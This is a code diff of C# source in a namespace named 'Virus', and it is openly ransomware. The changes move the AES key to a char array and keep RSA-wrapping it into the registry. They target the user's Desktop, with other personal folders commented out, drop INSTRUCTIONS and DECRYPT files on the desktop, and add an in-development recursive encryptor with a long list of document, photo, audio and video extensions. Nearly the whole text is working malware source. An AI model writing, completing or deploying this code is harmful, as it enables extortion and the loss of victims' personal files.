@@ -9,6 +9,7 @@ using System.Text;
 using System.Windows.Forms;
 using static Virus.RegHelpers;
 using static Virus.Form2;
+using System.Linq;
 
 namespace Virus
 {
@@ -16,7 +17,7 @@ namespace Virus
     {
         //TODO Remove  && !f.Contains(".ignore") from this document.
         private static string _encryptedExtension = ".encrypt";
-        public static string _aesKey;  //generate random key
+        public static char[] _aesKey;  //generate random key
         private static bool _DeleteAfterDecrypt = true;
         private static bool _DeleteAfterEncrypt = false;
 
@@ -25,9 +26,10 @@ namespace Virus
         private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
         private static string MUSIC_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
         private static string VIDEOS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
+        private static string DOWNLOADS_FOLDER = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads");
 
-        public static string instructionstxt = DESKTOP_FOLDER+@"\INSTRUCTIONS.txt";
-        public static string encrypttxt = DESKTOP_FOLDER+@"\ENCRYPTED.txt";
+        public static string instructionstxt = DESKTOP_FOLDER + @"\INSTRUCTIONS.txt";
+        public static string encrypttxt = DESKTOP_FOLDER + @"\ENCRYPTED.txt";
         public static string decryptexe = DESKTOP_FOLDER + @"\DECRYPT.EXE";
 
         public static int _encryptedFileCount = 0;
@@ -39,7 +41,7 @@ namespace Virus
         /// <param name="length"></param>
         /// <param name="chars"></param>
         /// <returns></returns>
-        public static string GenerateRandomString(int length, string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_")
+        public static char[] GenerateRandomCharArray(int length, string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_")
         {
             using (RNGCryptoServiceProvider crypto = new RNGCryptoServiceProvider())
             {
@@ -74,7 +76,7 @@ namespace Virus
                     result[i] = chars[value % chars.Length];
                 }
 
-                return new string(result);
+                return result;
             }
         }
 
@@ -107,7 +109,7 @@ namespace Virus
         /// </summary>
         /// <param name="inputFile"></param>
         /// <param name="password"></param>
-        private static void FileEncrypt(string inputFile, string password)
+        private static void FileEncrypt(string inputFile, char[] password)
         {
             //http://stackoverflow.com/questions/27645527/aes-encryption-on-large-files
 
@@ -161,7 +163,7 @@ namespace Virus
             {
                 Console.WriteLine("Error: " + ex.Message);
             }
-            finally 
+            finally
             {
                 File.AppendAllText(encrypttxt, $"\n{inputFile}");
                 cs.Close();
@@ -175,7 +177,7 @@ namespace Virus
         /// <param name="inputFile"></param>
         /// <param name="outputFile"></param>
         /// <param name="password"></param>
-        private static void FileDecrypt(string inputFile, string password)
+        private static void FileDecrypt(string inputFile, char[] password)
         {
 
             string outputFile = inputFile.Replace(_encryptedExtension, "");
@@ -238,21 +240,23 @@ namespace Virus
         /// Public Method to start encrypting
         /// </summary>
         public static void StartEncryption()
-        { 
+        {
             if (_aesKey == null)
             {
-                _aesKey = GenerateRandomString(32); //Created
+                _aesKey = GenerateRandomCharArray(32); //Created
                 Debug.WriteLine(_aesKey);
-                SetAESkey(RSAencryption.Encrypt(_aesKey)); //Once finished encrypting files, encrypt the aes key using rsa
+                SetAESkey(RSAencryption.Encrypt(_aesKey)); //encrypt the aes key using rsa store in registry
             }
-            List<string> dirToEncrypt = new List<string>() { DESKTOP_FOLDER, DOCUMENTS_FOLDER, PICTURES_FOLDER, MUSIC_FOLDER, VIDEOS_FOLDER };
+            List<string> dirToEncrypt = new List<string>() { DESKTOP_FOLDER, /*DOCUMENTS_FOLDER,DOWNLOADS_FOLDER, PICTURES_FOLDER, MUSIC_FOLDER, VIDEOS_FOLDER*/ };
             foreach (var dir in dirToEncrypt)
             {
                 encryptFolderContents(dir, _aesKey);
             }
-            _aesKey = GetAESkey(); //only needed on first run. does no harm on second run etc.
+            for (int i = 0; i < _aesKey.Length; i++)    //blanks out char array
+            {
+                _aesKey[i] = '\0';
+            }
 
-            
 
         }
 
@@ -263,12 +267,20 @@ namespace Virus
         /// <returns></returns>
         public static bool StartDecryption(string privkeytypedin)
         {
-            string decryptedaeskey = RSAencryption.Decrypt(_aesKey, privkeytypedin);
-            List<string> dirToDecrypt = new List<string>() { DESKTOP_FOLDER, DOCUMENTS_FOLDER, PICTURES_FOLDER, MUSIC_FOLDER, VIDEOS_FOLDER };
+
+            char[] decryptedaeskey = RSAencryption.Decrypt(GetAESkey(), privkeytypedin);
+            List<string> dirToDecrypt = new List<string>() { DESKTOP_FOLDER,/* DOCUMENTS_FOLDER, DOWNLOADS_FOLDER, PICTURES_FOLDER, MUSIC_FOLDER, VIDEOS_FOLDER*/ };
+
             foreach (var dir in dirToDecrypt)
             {
-                decryptFolderContents(dir, decryptedaeskey);
+                try
+                {
+                    decryptFolderContents(dir, decryptedaeskey);
+                }
+                catch { }
             }
+
+
             return true; //return anythinfg to make awaitable.
         }
 
@@ -277,7 +289,7 @@ namespace Virus
         /// </summary>
         /// <param name="sDir"></param>
         /// <param name="_aesKey"></param>
-        static void encryptFolderContents(string sDir, string _aesKey)
+        static void encryptFolderContents(string sDir, char[] _aesKey)
         {
             try
             {
@@ -321,7 +333,7 @@ namespace Virus
         /// </summary>
         /// <param name="sDir"></param>
         /// <param name="_aesKey"></param>
-        static void decryptFolderContents(string sDir, string _aesKey)
+        static void decryptFolderContents(string sDir, char[] _aesKey)
         {
             try
             {
@@ -332,18 +344,26 @@ namespace Virus
                         if (f.Contains(_encryptedExtension) && !f.Contains(".ignore") && f != System.AppDomain.CurrentDomain.FriendlyName)
                         {
                             Console.Out.WriteLine("Decrypting: " + f);
-                            FileDecrypt(f, _aesKey);
-                            _encryptedFileCount--;
+                            try
+                            {
+                                FileDecrypt(f, _aesKey);
+                                _encryptedFileCount--;
+                                if (_DeleteAfterDecrypt)
+                                {
+                                    File.Delete(f);
+                                }
+                            }
+                            catch
+                            {
+                                Debug.WriteLine($"Error decrypting {f}");
+                            }
                         }
                     }
                     catch (System.Exception excpt)
                     {
                         Console.WriteLine(excpt.Message);
                     }
-                    if (_DeleteAfterDecrypt)
-                    {
-                        File.Delete(f);
-                    }
+
                 }
 
                 foreach (string d in Directory.GetDirectories(sDir))
@@ -357,5 +377,47 @@ namespace Virus
             }
         }
 
+
+
+        //STILL IN DEVELOPMENT
+        private static readonly string[] extensionsToEncrypt = { "7z", "rar", "zip", "m3u", "m4a", "mp3", "wma", "ogg", "wav", "sqlite", "sqlite3", "img", "nrg", "tc", "doc", "docx", "docm", "odt", "rtf", "wpd", "wps", "csv", "key", "pdf", "pps", "ppt", "pptm", "pptx", "ps", "psd", "vcf", "xlr", "xls", "xlsx", "xlsm", "ods", "odp", "indd", "dwg", "dxf", "kml", "kmz", "gpx", "cad", "wmf", "txt", "3fr", "ari", "arw", "bay", "bmp", "cr2", "crw", "cxi", "dcr", "dng", "eip", "erf", "fff", "gif", "iiq", "j6i", "k25", "kdc", "mef", "mfw", "mos", "mrw", "nef", "nrw", "orf", "pef", "png", "raf", "raw", "rw2", "rwl", "rwz", "sr2", "srf", "srw", "x3f", "jpg", "jpeg", "tga", "tiff", "tif", "ai", "3g2", "3gp", "asf", "avi", "flv", "m4v", "mkv", "mov", "mp4", "mpg", "rm", "swf", "vob", "wmv" }; //files to decrypt
+
+        private static DriveInfo[] GetAttachedDrives()
+        {
+            return System.IO.DriveInfo.GetDrives();
+        }
+        private static void EncryptDirectory(string targetDirectory, char[] aesKey)
+        {
+            // Process the list of files found in the directory.
+            var fileEntries = Directory.EnumerateFiles(targetDirectory, "*.*").Where(file => extensionsToEncrypt.Any(x => file.EndsWith(x, StringComparison.OrdinalIgnoreCase) && !file.Contains(_encryptedExtension)));
+            foreach (string fileName in fileEntries)
+            {
+                FileEncrypt(fileName, aesKey);
+            }
+
+            // Recurse into subdirectories of this directory.
+            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
+            foreach (string subdirectory in subdirectoryEntries)
+                try
+                {   //Dont go into windows program files and temporary internet files. And other #ew ugly
+                    if (!subdirectory.Contains("All Users\\Microsoft\\") && !subdirectory.Contains("$Recycle.Bin") && !subdirectory.Contains("C:\\Windows") && !subdirectory.Contains("C:\\Program Files") && !subdirectory.Contains("Temporary Internet Files") && !subdirectory.Contains("AppData\\") && !subdirectory.Contains("\\source\\") && !subdirectory.Contains("C:\\ProgramData\\"))
+                    {
+                        EncryptDirectory(subdirectory, aesKey);
+                    }
+
+                }
+                catch
+                {
+                }
+        }
+
+
     }
 }
+
+
+
+
+
+
+
